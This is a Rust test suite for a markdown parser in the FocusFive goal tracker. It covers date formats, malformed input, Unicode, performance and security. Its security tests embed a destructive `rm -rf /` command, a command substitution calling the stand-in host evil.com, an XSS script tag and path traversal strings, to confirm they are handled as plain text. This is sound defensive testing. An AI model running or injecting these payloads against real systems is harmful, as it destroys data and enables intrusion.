use chrono::NaiveDate;
use focusfive::{data::parse_markdown, models::*};

/// Comprehensive test suite for markdown parser edge cases and vulnerabilities
///
/// This module tests the robustness of the FocusFive Phase 1 markdown parser
/// against various malformed inputs, edge cases, and potential security issues.

#[cfg(test)]
mod edge_case_tests {
    use super::*;

    // =============================================================================
    // 1. DATE FORMAT EDGE CASES
    // =============================================================================

    #[test]
    fn test_various_date_formats() {
        // Full month names
        let markdown = "# January 15, 2025 - Day 12\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown);
        assert!(result.is_ok());
        assert_eq!(
            result.unwrap().date,
            NaiveDate::from_ymd_opt(2025, 1, 15).unwrap()
        );

        // Abbreviated month names
        let markdown = "# Jan 15, 2025 - Day 12\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown);
        assert!(result.is_ok());
        assert_eq!(
            result.unwrap().date,
            NaiveDate::from_ymd_opt(2025, 1, 15).unwrap()
        );

        // Different months
        let test_cases = vec![
            ("February", 2),
            ("Feb", 2),
            ("March", 3),
            ("Mar", 3),
            ("April", 4),
            ("Apr", 4),
            ("May", 5),
            ("June", 6),
            ("Jun", 6),
            ("July", 7),
            ("Jul", 7),
            ("August", 8),
            ("Aug", 8),
            ("September", 9),
            ("Sep", 9),
            ("October", 10),
            ("Oct", 10),
            ("November", 11),
            ("Nov", 11),
            ("December", 12),
            ("Dec", 12),
        ];

        for (month_str, month_num) in test_cases {
            let markdown = format!("# {} 15, 2025 - Day 12\n\n## Work\n- [ ] Task", month_str);
            let result = parse_markdown(&markdown);
            assert!(result.is_ok(), "Failed to parse month: {}", month_str);
            assert_eq!(
                result.unwrap().date,
                NaiveDate::from_ymd_opt(2025, month_num, 15).unwrap()
            );
        }
    }

    #[test]
    fn test_day_number_variations() {
        // Single digit
        let markdown = "# January 1, 2025 - Day 1\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown).unwrap();
        assert_eq!(result.day_number, Some(1));

        // Double digit
        let markdown = "# January 15, 2025 - Day 42\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown).unwrap();
        assert_eq!(result.day_number, Some(42));

        // Triple digit
        let markdown = "# January 15, 2025 - Day 365\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown).unwrap();
        assert_eq!(result.day_number, Some(365));

        // Large number
        let markdown = "# January 15, 2025 - Day 999\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown).unwrap();
        assert_eq!(result.day_number, Some(999));

        // No day number
        let markdown = "# January 15, 2025\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown).unwrap();
        assert_eq!(result.day_number, None);
    }

    #[test]
    fn test_date_edge_cases() {
        // Leap year
        let markdown = "# February 29, 2024 - Day 60\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown);
        assert!(result.is_ok());

        // End of year
        let markdown = "# December 31, 2025 - Day 365\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown);
        assert!(result.is_ok());

        // Beginning of year
        let markdown = "# January 1, 2025 - Day 1\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown);
        assert!(result.is_ok());
    }

    // =============================================================================
    // 2. MALFORMED MARKDOWN TESTS
    // =============================================================================

    #[test]
    fn test_missing_headers() {
        // Missing main header
        let markdown = "## Work\n- [ ] Task";
        let result = parse_markdown(markdown);
        assert!(result.is_err(), "Should fail with missing main header");

        // Missing outcome headers
        let markdown = "# January 15, 2025 - Day 12\n\n- [ ] Task without header";
        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should parse but ignore orphaned actions");
        let goals = result.unwrap();
        // Actions should be empty since no outcome header was found
        assert_eq!(goals.work.actions[0].text, "");
    }

    #[test]
    fn test_wrong_checkbox_syntax() {
        let test_cases = vec![
            "- [y] Invalid checkbox", // Wrong letter
            "- [X ] Extra space",     // Space after X
            "- [ x] Space before x",  // Space before x
            "- [] Missing space",     // No space in checkbox
            "- [xx] Double x",        // Multiple x
            "- [ ] ] Extra bracket",  // Extra closing bracket
            "- [ Invalid no closing", // Missing closing bracket
            "* [x] Wrong bullet",     // Wrong bullet character
            "+ [x] Plus bullet",      // Plus bullet
            "- [X]No space after",    // No space after checkbox
        ];

        for invalid_syntax in test_cases {
            let markdown = format!("# January 15, 2025 - Day 12\n\n## Work\n{}", invalid_syntax);
            let result = parse_markdown(&markdown);
            // Should either ignore the line or fail gracefully
            if result.is_ok() {
                let goals = result.unwrap();
                // If parsed, the action should be empty or default
                assert_eq!(goals.work.actions[0].text, "");
            }
            // If it fails, that's also acceptable for malformed input
        }
    }

    #[test]
    fn test_invalid_date_formats() {
        let invalid_dates = vec![
            "# Invalid Date Format",
            "# 2025-01-15",         // ISO format instead of expected
            "# 15 January 2025",    // Day before month
            "# Jan 32, 2025",       // Invalid day
            "# February 30, 2025",  // Invalid day for month
            "# Janvember 15, 2025", // Invalid month
            "# January 15",         // Missing year
            "# January, 2025",      // Missing day
            "# 15, 2025",           // Missing month
            "",                     // Empty header
            "No hash at start",     // No hash
        ];

        for invalid_date in invalid_dates {
            let markdown = format!("{}\n\n## Work\n- [ ] Task", invalid_date);
            let result = parse_markdown(&markdown);
            assert!(
                result.is_err(),
                "Should fail for invalid date: {}",
                invalid_date
            );
        }
    }

    // =============================================================================
    // 3. EMPTY FILES AND MISSING SECTIONS
    // =============================================================================

    #[test]
    fn test_empty_file() {
        let result = parse_markdown("");
        assert!(result.is_err(), "Empty file should fail");
    }

    #[test]
    fn test_whitespace_only_file() {
        let result = parse_markdown("   \n\n\t\n  ");
        assert!(result.is_err(), "Whitespace-only file should fail");
    }

    #[test]
    fn test_header_only() {
        let markdown = "# January 15, 2025 - Day 12";
        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Header-only should parse successfully");
        let goals = result.unwrap();
        // All actions should be empty
        assert_eq!(goals.work.actions[0].text, "");
        assert_eq!(goals.health.actions[0].text, "");
        assert_eq!(goals.family.actions[0].text, "");
    }

    #[test]
    fn test_missing_outcome_sections() {
        // Only Work section
        let markdown = "# January 15, 2025 - Day 12\n\n## Work\n- [x] Task 1";
        let result = parse_markdown(markdown).unwrap();
        assert_eq!(result.work.actions[0].text, "Task 1");
        assert_eq!(result.health.actions[0].text, ""); // Should be empty
        assert_eq!(result.family.actions[0].text, ""); // Should be empty

        // Only Health section
        let markdown = "# January 15, 2025 - Day 12\n\n## Health\n- [x] Exercise";
        let result = parse_markdown(markdown).unwrap();
        assert_eq!(result.work.actions[0].text, ""); // Should be empty
        assert_eq!(result.health.actions[0].text, "Exercise");
        assert_eq!(result.family.actions[0].text, ""); // Should be empty
    }

    // =============================================================================
    // 4. WHITESPACE AND INDENTATION VARIATIONS
    // =============================================================================

    #[test]
    fn test_extra_whitespace() {
        let markdown = r#"   # January 15, 2025 - Day 12   

    ## Work (Goal: Ship v1)    
  - [x]   Call investors   
    - [ ]     Prep deck     
  - [ ] Team standup

      ## Health (Goal: Run 5k)      
- [x] Morning run    
 - [ ]  Meal prep
- [ ]   Sleep by 10pm   "#;

        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should handle extra whitespace");
        let goals = result.unwrap();
        assert_eq!(goals.work.actions[0].text, "Call investors");
        assert_eq!(goals.work.actions[1].text, "Prep deck");
        assert_eq!(goals.health.actions[0].text, "Morning run");
    }

    #[test]
    fn test_mixed_line_endings() {
        // Mix of \n and \r\n
        let markdown = "# January 15, 2025 - Day 12\r\n\n## Work\r\n- [x] Task 1\n- [ ] Task 2\r\n";
        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should handle mixed line endings");
    }

    #[test]
    fn test_tabs_vs_spaces() {
        let markdown = "# January 15, 2025 - Day 12\n\n##\tWork\n-\t[x]\tTask with tabs\n- [ ] Task with spaces";
        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should handle tabs and spaces");
    }

    // =============================================================================
    // 5. CASE SENSITIVITY TESTS
    // =============================================================================

    #[test]
    fn test_checkbox_case_sensitivity() {
        let markdown = r#"# January 15, 2025 - Day 12

## Work
- [x] lowercase x
- [X] uppercase X
- [ ] empty checkbox"#;

        let result = parse_markdown(markdown).unwrap();
        assert!(
            result.work.actions[0].completed,
            "Should accept lowercase x"
        );
        assert!(
            result.work.actions[1].completed,
            "Should accept uppercase X"
        );
        assert!(
            !result.work.actions[2].completed,
            "Empty checkbox should be false"
        );
    }

    #[test]
    fn test_outcome_header_case_sensitivity() {
        // Current implementation expects exact case
        let test_cases = vec![
            ("## work", false),   // lowercase
            ("## WORK", false),   // uppercase
            ("## Work", true),    // correct case
            ("## health", false), // lowercase
            ("## HEALTH", false), // uppercase
            ("## Health", true),  // correct case
            ("## family", false), // lowercase
            ("## FAMILY", false), // uppercase
            ("## Family", true),  // correct case
        ];

        for (header, should_parse) in test_cases {
            let markdown = format!("# January 15, 2025 - Day 12\n\n{}\n- [x] Task", header);
            let result = parse_markdown(&markdown);
            assert!(result.is_ok(), "Should always parse without error");

            let goals = result.unwrap();
            if should_parse {
                // Should have parsed the action
                assert_ne!(
                    goals.work.actions[0].text, "",
                    "Should parse action for: {}",
                    header
                );
            } else {
                // Should not have parsed the action
                assert_eq!(
                    goals.work.actions[0].text, "",
                    "Should not parse action for: {}",
                    header
                );
            }
        }
    }

    #[test]
    fn test_month_case_sensitivity() {
        let test_cases = vec!["january", "JANUARY", "January", "jan", "JAN", "Jan"];

        for month in test_cases {
            let markdown = format!("# {} 15, 2025 - Day 12\n\n## Work\n- [ ] Task", month);
            let result = parse_markdown(&markdown);
            assert!(
                result.is_ok(),
                "Should parse month case insensitively: {}",
                month
            );
            assert_eq!(
                result.unwrap().date,
                NaiveDate::from_ymd_opt(2025, 1, 15).unwrap()
            );
        }
    }

    // =============================================================================
    // 6. UNICODE AND SPECIAL CHARACTERS
    // =============================================================================

    #[test]
    fn test_unicode_in_action_text() {
        let markdown = r#"# January 15, 2025 - Day 12

## Work
- [x] 🎯 Complete project goals
- [ ] Send email to François
- [x] Review 日本語 documentation

## Health
- [ ] Exercise with 💪 motivation
- [x] Eat healthy 🥗 lunch
- [ ] Sleep 😴 8 hours

## Family
- [x] Call parents ❤️
- [ ] Plan vacation 🏖️
- [ ] Buy gifts 🎁"#;

        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should handle unicode characters");
        let goals = result.unwrap();

        assert_eq!(goals.work.actions[0].text, "🎯 Complete project goals");
        assert_eq!(goals.work.actions[1].text, "Send email to François");
        assert_eq!(goals.work.actions[2].text, "Review 日本語 documentation");
        assert_eq!(goals.health.actions[0].text, "Exercise with 💪 motivation");
        assert_eq!(goals.family.actions[0].text, "Call parents ❤️");
    }

    #[test]
    fn test_special_characters_in_goal_text() {
        let markdown = r#"# January 15, 2025 - Day 12

## Work (Goal: Ship v1.0 & get $1M funding!)
- [ ] Task 1

## Health (Goal: Run 5k in <25min @ 80% effort)
- [ ] Task 2

## Family (Goal: Be 100% present w/ kids)
- [ ] Task 3"#;

        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should handle special characters in goals");
        let goals = result.unwrap();

        assert_eq!(
            goals.work.goal,
            Some("Ship v1.0 & get $1M funding!".to_string())
        );
        assert_eq!(
            goals.health.goal,
            Some("Run 5k in <25min @ 80% effort".to_string())
        );
        assert_eq!(
            goals.family.goal,
            Some("Be 100% present w/ kids".to_string())
        );
    }

    #[test]
    fn test_markdown_syntax_in_text() {
        let markdown = r#"# January 15, 2025 - Day 12

## Work
- [x] **Bold** task with *italic* text
- [ ] Task with `code` and [link](url)
- [ ] Task with # hash and ## double hash

## Health
- [x] Exercise > 30min
- [ ] Eat < 2000 calories
- [ ] Sleep & recover"#;

        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should handle markdown syntax in text");
        let goals = result.unwrap();

        assert_eq!(
            goals.work.actions[0].text,
            "**Bold** task with *italic* text"
        );
        assert_eq!(
            goals.work.actions[1].text,
            "Task with `code` and [link](url)"
        );
        assert_eq!(
            goals.work.actions[2].text,
            "Task with # hash and ## double hash"
        );
        assert_eq!(goals.health.actions[0].text, "Exercise > 30min");
    }

    // =============================================================================
    // 7. GOAL PARSING WITH PARENTHESES AND SPECIAL CHARACTERS
    // =============================================================================

    #[test]
    fn test_nested_parentheses_in_goals() {
        let markdown = r#"# January 15, 2025 - Day 12

## Work (Goal: Complete project (phase 1) by Q1)
- [ ] Task 1

## Health (Goal: Run marathon (26.2 miles) in spring)
- [ ] Task 2

## Family (Goal: Plan vacation (2 weeks) to Europe)
- [ ] Task 3"#;

        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should handle nested parentheses");
        let goals = result.unwrap();

        // Current regex implementation might not handle nested parentheses correctly
        // This test documents the current behavior
        assert!(goals.work.goal.is_some());
        assert!(goals.health.goal.is_some());
        assert!(goals.family.goal.is_some());
    }

    #[test]
    fn test_goals_without_parentheses() {
        let markdown = r#"# January 15, 2025 - Day 12

## Work Goal: Complete project
- [ ] Task 1

## Health - Run 5k
- [ ] Task 2

## Family Some goal text
- [ ] Task 3"#;

        let result = parse_markdown(markdown);
        assert!(
            result.is_ok(),
            "Should parse even with malformed goal syntax"
        );
        let goals = result.unwrap();

        // Goals should be None since they don't match the expected pattern
        assert_eq!(goals.work.goal, None);
        assert_eq!(goals.health.goal, None);
        assert_eq!(goals.family.goal, None);
    }

    // =============================================================================
    // 8. DAY NUMBER BOUNDARY TESTS
    // =============================================================================

    #[test]
    fn test_day_number_boundaries() {
        // Zero - should parse but might be logically invalid
        let markdown = "# January 15, 2025 - Day 0\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown);
        assert!(result.is_ok());
        assert_eq!(result.unwrap().day_number, Some(0));

        // Very large number
        let markdown = "# January 15, 2025 - Day 99999\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown);
        assert!(result.is_ok());
        assert_eq!(result.unwrap().day_number, Some(99999));

        // Negative number - regex should not match
        let markdown = "# January 15, 2025 - Day -5\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown);
        assert!(result.is_ok());
        assert_eq!(result.unwrap().day_number, None); // Should not parse negative
    }

    #[test]
    fn test_multiple_day_references() {
        let markdown = "# January 15, 2025 - Day 12 of Day 365\n\n## Work\n- [ ] Task";
        let result = parse_markdown(markdown);
        assert!(result.is_ok());
        // Should match the first occurrence
        assert_eq!(result.unwrap().day_number, Some(12));
    }

    // =============================================================================
    // 9. VERY LONG TEXT TESTS
    // =============================================================================

    #[test]
    fn test_very_long_action_text() {
        let long_text = "a".repeat(1000);
        let markdown = format!(
            r#"# January 15, 2025 - Day 12

## Work
- [x] {}
- [ ] Normal task"#,
            long_text
        );

        let result = parse_markdown(&markdown);
        assert!(result.is_ok(), "Should handle very long action text");
        let goals = result.unwrap();
        assert_eq!(goals.work.actions[0].text, long_text);
        assert_eq!(goals.work.actions[1].text, "Normal task");
    }

    #[test]
    fn test_very_long_goal_text() {
        let long_goal = "a".repeat(500);
        let markdown = format!(
            r#"# January 15, 2025 - Day 12

## Work (Goal: {})
- [ ] Task"#,
            long_goal
        );

        let result = parse_markdown(&markdown);
        assert!(result.is_ok(), "Should handle very long goal text");
        let goals = result.unwrap();
        assert_eq!(goals.work.goal, Some(long_goal));
    }

    #[test]
    fn test_extremely_long_header() {
        let long_month = "January".repeat(100);
        let markdown = format!("# {} 15, 2025 - Day 12\n\n## Work\n- [ ] Task", long_month);
        let result = parse_markdown(&markdown);
        // Should fail since it's not a valid month name
        assert!(result.is_err());
    }

    // =============================================================================
    // 10. EXTRA CONTENT BEFORE/AFTER EXPECTED FORMAT
    // =============================================================================

    #[test]
    fn test_content_before_header() {
        let markdown = r#"Some random text
Another line
# January 15, 2025 - Day 12

## Work
- [x] Task 1"#;

        let result = parse_markdown(markdown);
        // Should fail because the header is not on the first line
        assert!(result.is_err(), "Should fail when header is not first");
    }

    #[test]
    fn test_content_after_expected_format() {
        let markdown = r#"# January 15, 2025 - Day 12

## Work
- [x] Task 1
- [ ] Task 2
- [ ] Task 3

## Health
- [x] Exercise
- [ ] Eat well
- [ ] Sleep

## Family
- [ ] Call parents
- [x] Spend time
- [x] Help kids

# Some other content after
This should be ignored
## Another section
- [ ] This should not be parsed"#;

        let result = parse_markdown(markdown);
        assert!(
            result.is_ok(),
            "Should parse valid part and ignore extra content"
        );
        let goals = result.unwrap();

        // Should have parsed the valid sections
        assert_eq!(goals.work.actions[0].text, "Task 1");
        assert_eq!(goals.health.actions[0].text, "Exercise");
        assert_eq!(goals.family.actions[0].text, "Call parents");
    }

    #[test]
    fn test_extra_empty_lines() {
        let markdown = r#"


# January 15, 2025 - Day 12



## Work


- [x] Task 1


- [ ] Task 2



## Health



- [x] Exercise


"#;

        let result = parse_markdown(markdown);
        assert!(
            result.is_err(),
            "Should fail due to header not being first line"
        );
    }

    // =============================================================================
    // 11. MORE THAN 3 ACTIONS PER OUTCOME
    // =============================================================================

    #[test]
    fn test_more_than_three_actions() {
        let markdown = r#"# January 15, 2025 - Day 12

## Work
- [x] Task 1
- [ ] Task 2
- [ ] Task 3
- [x] Task 4 (should be ignored)
- [ ] Task 5 (should be ignored)

## Health
- [x] Exercise
- [ ] Eat well
- [ ] Sleep
- [ ] Extra task (should be ignored)"#;

        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should parse but ignore extra actions");
        let goals = result.unwrap();

        // Should only have first 3 actions
        assert_eq!(goals.work.actions[0].text, "Task 1");
        assert_eq!(goals.work.actions[1].text, "Task 2");
        assert_eq!(goals.work.actions[2].text, "Task 3");

        assert_eq!(goals.health.actions[0].text, "Exercise");
        assert_eq!(goals.health.actions[1].text, "Eat well");
        assert_eq!(goals.health.actions[2].text, "Sleep");
    }

    // =============================================================================
    // 12. REGEX PATTERN VALIDATION TESTS
    // =============================================================================

    #[test]
    fn test_regex_patterns_dont_catastrophically_backtrack() {
        // Test with input designed to cause catastrophic backtracking
        let many_open_parens = "(".repeat(100);
        let markdown = format!(
            "# January 15, 2025 - Day 12\n\n## Work (Goal: {})\n- [ ] Task",
            many_open_parens
        );

        // This should complete quickly, not hang
        let start = std::time::Instant::now();
        let result = parse_markdown(&markdown);
        let duration = start.elapsed();

        assert!(
            duration.as_secs() < 1,
            "Regex should not take more than 1 second"
        );
        assert!(result.is_ok());
    }

    #[test]
    fn test_regex_edge_cases() {
        // Test various patterns that might confuse the regex
        let test_cases = vec![
            "# January 15, 2025 - Day Day 12",  // Double "Day"
            "# January 15, 2025 - Day12",       // No space before number
            "# January 15, 2025-Day 12",        // No space before dash
            "# January 15,2025 - Day 12",       // No space after comma
            "# January  15,  2025  -  Day  12", // Multiple spaces
        ];

        for test_case in test_cases {
            let markdown = format!("{}\n\n## Work\n- [ ] Task", test_case);
            let result = parse_markdown(&markdown);
            // Each case should either parse correctly or fail gracefully
            // No panics or infinite loops
            assert!(result.is_ok() || result.is_err());
        }
    }

    // =============================================================================
    // 13. PARSER ROBUSTNESS TESTS
    // =============================================================================

    #[test]
    fn test_null_bytes_and_control_characters() {
        let markdown = "# January 15, 2025 - Day 12\n\n## Work\n- [x] Task with \0 null byte\n- [ ] Task with \x01 control char";
        let result = parse_markdown(markdown);
        assert!(
            result.is_ok(),
            "Should handle null bytes and control characters"
        );
    }

    #[test]
    fn test_binary_data() {
        let binary_data = vec![0x00, 0xFF, 0xFE, 0xFD];
        let binary_string = String::from_utf8_lossy(&binary_data);
        let markdown = format!(
            "# January 15, 2025 - Day 12\n\n## Work\n- [x] {}",
            binary_string
        );
        let result = parse_markdown(&markdown);
        // Should not panic, might fail gracefully
        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn test_memory_exhaustion_protection() {
        // Very large file that could cause memory issues
        let large_content =
            "# January 15, 2025 - Day 12\n\n## Work\n".to_string() + &"- [ ] Task\n".repeat(100000);

        let start = std::time::Instant::now();
        let result = parse_markdown(&large_content);
        let duration = start.elapsed();

        assert!(
            duration.as_secs() < 5,
            "Should not take more than 5 seconds for large input"
        );
        assert!(result.is_ok(), "Should handle large input");
    }

    // =============================================================================
    // 14. REAL-WORLD EDGE CASES
    // =============================================================================

    #[test]
    fn test_copy_paste_artifacts() {
        // Common copy-paste artifacts
        let markdown = "# January 15, 2025 - Day 12\u{200B}\n\n## Work\u{FEFF}\n- [x] Task with invisible chars\u{200C}";
        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should handle invisible Unicode characters");
    }

    #[test]
    fn test_different_newline_styles() {
        // Windows style (\r\n)
        let markdown = "# January 15, 2025 - Day 12\r\n\r\n## Work\r\n- [x] Task 1\r\n";
        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should handle Windows newlines");

        // Old Mac style (\r)
        let markdown = "# January 15, 2025 - Day 12\r\r## Work\r- [x] Task 1\r";
        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should handle old Mac newlines");

        // Mixed styles
        let markdown = "# January 15, 2025 - Day 12\r\n\n## Work\r- [x] Task 1\n";
        let result = parse_markdown(markdown);
        assert!(result.is_ok(), "Should handle mixed newline styles");
    }

    // =============================================================================
    // 15. SECURITY CONSIDERATIONS
    // =============================================================================

    #[test]
    fn test_no_code_injection() {
        // Test that malicious content doesn't get executed
        let malicious_content = r#"# January 15, 2025 - Day 12

## Work
- [x] `rm -rf /`
- [ ] $(curl evil.com)
- [ ] ${dangerous_var}

## Health  
- [x] Task with <script>alert('xss')</script>
- [ ] Task with javascript:void(0)"#;

        let result = parse_markdown(malicious_content);
        assert!(result.is_ok(), "Should parse malicious content safely");
        let goals = result.unwrap();

        // Content should be treated as plain text
        assert_eq!(goals.work.actions[0].text, "`rm -rf /`");
        assert_eq!(goals.work.actions[1].text, "$(curl evil.com)");
        assert_eq!(
            goals.health.actions[0].text,
            "Task with <script>alert('xss')</script>"
        );
    }

    #[test]
    fn test_path_traversal_attempts() {
        let markdown = r#"# January 15, 2025 - Day 12

## Work
- [x] ../../../etc/passwd
- [ ] ..\..\windows\system32
- [ ] Task with ../../../../sensitive/file"#;

        let result = parse_markdown(markdown);
        assert!(
            result.is_ok(),
            "Should handle path traversal attempts safely"
        );
        let goals = result.unwrap();

        // Should be treated as plain text
        assert_eq!(goals.work.actions[0].text, "../../../etc/passwd");
        assert_eq!(goals.work.actions[1].text, "..\\..\\windows\\system32");
    }

    // =============================================================================
    // 16. PERFORMANCE REGRESSION TESTS
    // =============================================================================

    #[test]
    fn test_performance_with_many_lines() {
        let mut content = "# January 15, 2025 - Day 12\n\n## Work\n".to_string();
        for i in 0..1000 {
            content.push_str(&format!("- [ ] Task {}\n", i));
        }

        let start = std::time::Instant::now();
        let result = parse_markdown(&content);
        let duration = start.elapsed();

        assert!(result.is_ok(), "Should parse many lines successfully");
        assert!(
            duration.as_millis() < 100,
            "Should parse 1000 lines in under 100ms"
        );
    }

    #[test]
    fn test_performance_with_long_lines() {
        let long_task = "a".repeat(10000);
        let markdown = format!(
            r#"# January 15, 2025 - Day 12

## Work
- [x] {}
- [ ] Short task
- [ ] Another short task"#,
            long_task
        );

        let start = std::time::Instant::now();
        let result = parse_markdown(&markdown);
        let duration = start.elapsed();

        assert!(result.is_ok(), "Should parse long lines successfully");
        assert!(
            duration.as_millis() < 50,
            "Should parse long lines in under 50ms"
        );
    }
}

/// Integration tests that verify the parser works correctly with the file I/O layer
#[cfg(test)]
mod integration_tests {
    use super::*;
    use std::io::Write;
    use tempfile::NamedTempFile;

    #[test]
    fn test_parse_from_file_with_bom() {
        // Create a temporary file with BOM (Byte Order Mark)
        let mut temp_file = NamedTempFile::new().unwrap();
        let content_with_bom =
            "\u{FEFF}# January 15, 2025 - Day 12\n\n## Work\n- [x] Task with BOM";
        temp_file.write_all(content_with_bom.as_bytes()).unwrap();
        temp_file.flush().unwrap();

        let content = std::fs::read_to_string(temp_file.path()).unwrap();
        let result = parse_markdown(&content);

        // Should handle BOM gracefully
        assert!(result.is_ok() || result.is_err()); // Either works or fails gracefully
    }

    #[test]
    fn test_parse_corrupted_utf8() {
        // Create file with invalid UTF-8 sequences
        let mut temp_file = NamedTempFile::new().unwrap();
        let mut invalid_utf8 = b"# January 15, 2025 - Day 12\n\n## Work\n- [x] Task with ".to_vec();
        invalid_utf8.extend_from_slice(&[0xFF, 0xFE]); // Invalid UTF-8
        invalid_utf8.extend_from_slice(b" invalid bytes");

        temp_file.write_all(&invalid_utf8).unwrap();
        temp_file.flush().unwrap();

        // Using read_to_string should handle this with replacement characters
        let content = std::fs::read_to_string(temp_file.path()).unwrap();
        let result = parse_markdown(&content);

        // Should not panic
        assert!(result.is_ok() || result.is_err());
    }
}
